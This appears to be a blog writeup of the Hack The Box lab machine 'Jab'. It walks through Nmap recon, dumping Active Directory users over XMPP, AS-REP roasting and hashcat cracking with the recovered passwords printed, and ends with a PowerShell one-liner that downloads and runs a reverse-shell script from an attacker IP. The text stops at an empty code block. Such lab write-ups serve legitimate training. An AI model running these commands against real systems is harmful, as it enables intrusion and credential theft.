---
title:  "HTB Jab Writeup"
date:   2024-06-29 00:30:00 
categories: HTB Machine
tags: jabber openfire password_cracking as-rep_roasting
---

![Jab](/assets/img/Jab/GHCW-llXkAAIVvV.png)

## Introduction 

Jab was for me a fun experience to play around with some new technology that i didn't have much experience with yet. This made it a little bit harder to get into initially but once i got going the path to system was quite clear. Exploiting the XMPP services was a fun experience as well as fine tuning the openfire plugin to make it run my malicious code

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.129.108.11
```
**Nmap**
```
# Nmap 7.93 scan initiated Tue Feb 27 09:12:41 2024 as: nmap -sS -A -p- -o nmap 10.129.108.11
Nmap scan report for 10.129.108.11
Host is up (0.054s latency).
Not shown: 65499 closed tcp ports (reset)
PORT      STATE SERVICE             VERSION
53/tcp    open  domain              Simple DNS Plus
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-02-27 14:13:25Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-02-27T14:14:55+00:00; -2s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-02-27T14:14:55+00:00; -2s from scanner time.
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-27T14:14:56+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-27T14:14:55+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
5222/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     features: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
|     stream_id: 3czxiqala8
|_    capabilities: 
5223/tcp  open  ssl/jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     compression_methods: 
|_    capabilities: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
|_ssl-date: TLS randomness does not represent time
5262/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     features: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
|     stream_id: 6qy17mtbn0
|_    capabilities: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5263/tcp  open  ssl/jabber
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     compression_methods: 
|_    capabilities: 
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     compression_methods: 
|_    capabilities: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5275/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     features: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     compression_methods: 
|     stream_id: 8r918hsg0c
|_    capabilities: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp  open  ssl/jabber
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|     compression_methods: 
|_    capabilities: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7070/tcp  open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 27 Feb 2024 14:13:25 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 27 Feb 2024 14:13:30 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp  open  ssl/oracleas-https?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 27 Feb 2024 14:13:37 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 27 Feb 2024 14:13:43 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf              .NET Message Framing
47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49671/tcp open  msrpc               Microsoft Windows RPC
49686/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc               Microsoft Windows RPC
49689/tcp open  msrpc               Microsoft Windows RPC
49714/tcp open  msrpc               Microsoft Windows RPC
49768/tcp open  msrpc               Microsoft Windows RPC
52672/tcp open  msrpc               Microsoft Windows RPC
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.93%I=7%D=2/27%Time=65DDEE1A%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5223-TCP:V=7.93%T=SSL%I=7%D=2/27%Time=65DDEE28%P=x86_64-pc-linux-gn
SF:u%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\
SF:.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-
SF:streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.93%I=7%D=2/27%Time=65DDEE1A%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5263-TCP:V=7.93%T=SSL%I=7%D=2/27%Time=65DDEE28%P=x86_64-pc-linux-gn
SF:u%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\
SF:.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-
SF:streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.93%I=7%D=2/27%Time=65DDEE1A%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5276-TCP:V=7.93%T=SSL%I=7%D=2/27%Time=65DDEE28%P=x86_64-pc-linux-gn
SF:u%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\
SF:.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-
SF:streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.93%I=7%D=2/27%Time=65DDEE06%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2027\x20Feb\x202
SF:024\x2014:13:25\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x202022\x
SF:2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20by
SF:tes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title>Openf
SF:ire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><font\x
SF:20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http://www\.
SF:xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Service</b
SF:></font></body>\n</html>\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Unkn
SF:own\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(HTTPOptions,56,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2027\x20Feb\x202024\x2014:13:30\
SF:x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"HTTP
SF:/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20
SF:character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;
SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
SF:x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Illeg
SF:al\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8
SF:859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x
SF:20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</
SF:pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20tex
SF:t/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x20cl
SF:ose\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</pre
SF:>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNT
SF:L=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
SF:th:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1>
SF:<pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7443-TCP:V=7.93%T=SSL%I=7%D=2/27%Time=65DDEE13%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2027\x20Fe
SF:b\x202024\x2014:13:37\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x20
SF:2022\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:
SF:\x20bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title
SF:>Openfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><
SF:font\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http:/
SF:/www\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Serv
SF:ice</b></font></body>\n</html>\n")%r(HTTPOptions,56,"HTTP/1\.1\x20200\x
SF:20OK\r\nDate:\x20Tue,\x2027\x20Feb\x202024\x2014:13:43\x20GMT\r\nAllow:
SF:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\
SF:x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\
SF:r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Mess
SF:age\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck,C7
SF:,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illeg
SF:al\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1
SF:\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text
SF:/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20clo
SF:se\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20char
SF:acter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x2
SF:0Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset
SF:=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1
SF:>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL
SF:=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:
SF:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20UR
SF:I</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\
SF:x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten
SF:t-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2040
SF:0</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/27%OT=53%CT=1%CU=31147%PV=Y%DS=2%DC=T%G=Y%TM=65DDEE6
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M542NW8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS
OS:%O6=M542NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2024-02-27T14:14:47
|_  start_date: N/A

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   105.16 ms 10.10.16.1
2   27.10 ms  10.129.108.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 27 09:15:01 2024 -- 1 IP address (1 host up) scanned in 140.80 seconds
```


### Exploiting XMPP
When reviewing the Nmap output we can see that the machine is a domain controller with a few extra ports open. Upon first inspection i noticed that it was using an xmpp service marked under jabber. Seeing that the machine's name is called Jab i thought this would be a good place to start. XMPP is a service often used for chat clients so we'd have to start out by getting a XMPP client. I decided to use pidgin for this. if you don't have pidgin yet you can install it with the following commands

```bash
sudo apt-get update
sudo apt-get install pidgin
```

Next up we run pidgin and we'll get to see the following window.

![pidgin start](/assets/img/Jab/Jab_01.png)

Next we create our profile where we set it up to create a new account upon connection.

![pidgin User](/assets/img/Jab/Jab_02.png)

Then on the advanced page we need to setup up our connection parameters, We can keep these mostly default the only thing we need to change is adding the connect server to jab.htb

![pidgin Connection settings](/assets/img/Jab/Jab_03.png)

Then after we press add the following window will pop up asking us to register our user, set a username and password here.

![Registration](/assets/img/Jab/Jab_04.png)

Then after registration we'd be logged in. While going through the application we had access to some rooms but nothing interesting was said in those. When looking further it was possible to dump all active directory users by using the **search for users** function within the **accounts** tab

![Search for users](/assets/img/Jab/Jab_05.png)

When clicking through the menu its possible to dump a full list of all users.

![Users](/assets/img/Jab/Jab_06.png)

After getting a full list of all domain users there are a few attacks we can explore. I tried to see if any of these had an empty password without success, Then i tried username is password this also gave no results. Then lastly i tried as-rep roasting with impacket to try and obtain some password hashes of users.

```bash
impacket-GetNPUsers jab.htb/ -no-pass -usersfile users.txt -format hashcat  -request -outputfile hashes.txt
```

This gave us the following three hashes.

```
$krb5asrep$23$jmontgomery@JAB.HTB:eed3c51e25cef5fa6a0f1d4914913fc3$eea8cef9876b339723612f92399f43ed61868432a200caf37593df1951d81aa3bb448a754d509d08e5ce35a2780362476a7368bc71cbbb8bb06c271f7be06a86c7b143db3db5d35dffb85a1ac976460f13330724b4be7095adedea9880d8d7eaf94fb3e3b8010c883a454b0ee871a8833dbf020ce20e3a46ab7ecb82349d94d6af8c8bb3ce0dd966bd606a8db97ed4b152d1c9de71182b2a2689013aa8f62cb1c5457601d7bec071c6bfb8c4d5bfcdb04278ab0896ceaf22b90edcaf4a7834b3dc57e6ddd3cb69eae1dc91750e26685fc29a5f82d1e1be5421e45976e8998bb4e57a
$krb5asrep$23$lbradford@JAB.HTB:50b88e43785144b7be4abdf327791b32$644a2cdb2fd17fa5a06ec1baa5a65543ec0da0fb2bf3664d8d479cb8d42a90147d73fa26c2f9e54cd11828c5c16042a4d050afe83330c3e5e7a1026e9b51c225fa41622a2b541b7023617446aff2d2674dac8d50a1eca670b966cc428b7feabee1d2682147fb36f94ccbe415a258547601c77341861009ecd1e708bb7fac211385d83380f84f5d14e0bbc01c4240be090bf2953d4ad6b87833c7d74afd9c68aca131ccc3feb477cff9efb181a266c7a29b07316150b2e62ab99e06ca62a7ac7a715f27af644c2c620195355333080c1159df110475161898d8b748b06e0e005b9bdd
$krb5asrep$23$mlowe@JAB.HTB:567ff135c1192c03ccc9e40ca212543a$63ae28aaa6412c32d8aec084135ab981d1b4c3b5e85f674fc71315b9ae63c16c7d382601f7c8aae4d9d52d94cb6f9ef51ecbf0df1e9c3d682de398e6edae722b6e67eb3bdd3b0de1b125c4136dd53711e7ac8ac1fff98b1a7675932fd74ea50ee5f0e2bea74c726afe570ee981b619a2c2c71744d65e1d452a39918f72e1fd2242fa1c6d80bc4e18ecb88f5ce532ed2d8b34997f7115368c1149425365fd977f3e9096d6ef6b2bc9937710f4a6fa59060bca9becd77cd6b222fbbe9f6a8be29cba0b2c2a853799195b68ff7308628a456350024d108b1893f66ede1b34295ea895c0
```

Next i was able to crack the password of **jmontgomery** their password was **Midnight_121**


```
hashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

**cracked.txt**
```
$krb5asrep$23$jmontgomery@JAB.HTB:eed3c51e25cef5fa6a0f1d4914913fc3$eea8cef9876b339723612f92399f43ed61868432a200caf37593df1951d81aa3bb448a754d509d08e5ce35a2780362476a7368bc71cbbb8bb06c271f7be06a86c7b143db3db5d35dffb85a1ac976460f13330724b4be7095adedea9880d8d7eaf94fb3e3b8010c883a454b0ee871a8833dbf020ce20e3a46ab7ecb82349d94d6af8c8bb3ce0dd966bd606a8db97ed4b152d1c9de71182b2a2689013aa8f62cb1c5457601d7bec071c6bfb8c4d5bfcdb04278ab0896ceaf22b90edcaf4a7834b3dc57e6ddd3cb69eae1dc91750e26685fc29a5f82d1e1be5421e45976e8998bb4e57a:Midnight_121
```

So now we have access to the credentials of jmontgomery. With these credentials i was not able to do much interesting on the active directory level. We could however log back into XMPP  with these credentials and get access to a new chat named **pentest2003**

![Pentest2003](/assets/img/Jab/Jab_07.png)

when entering this chat we could see that there was a discussion about the password of the svc_openfire user being disclosed and cracked using kerberoasting.In this same screenshot we could also see the password

![svc_openfire access](/assets/img/Jab/Jab_08.png)


Now that we see these credentials my first thought was to use netexec to test out if these were valid.

```bash
netexec smb jab.htb -u 'svc_openfire'  -p '!@#$%^&*(1qazxsw'
```
![svc_openfire valid credentials](/assets/img/Jab/Jab_09.png)


So now we know that the credentials of svc_openfire were valid the next step is to try and use these credentials to get command execution on the machine. So i started to go through the different methods to get command execution remotely. Winrm didn't work neither did we have enough permissions to use smb to execute commands, after a bit of searching i found out that we might also be able to execute commands using DCOM. I was able to get a reverse shell using DCOM but before we could do this we needed to setup a copy of the **Invoke-PowerShellTcp.ps1** script from [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i setup a webserver in the shells directory of the github project using python where i'll host this script.

```bash
python -m http.server 80
```

So now the preparations for our payload were made. Next the powershell command to open a erverse shell would look like the following.

```powershell
powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.16.61/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.61 -Port 443
```

When applying this command to the structure of dcomexec of impacket the command would look like the following. After executing this a moment later we'd be greeted with a reverse shell.

```bash 
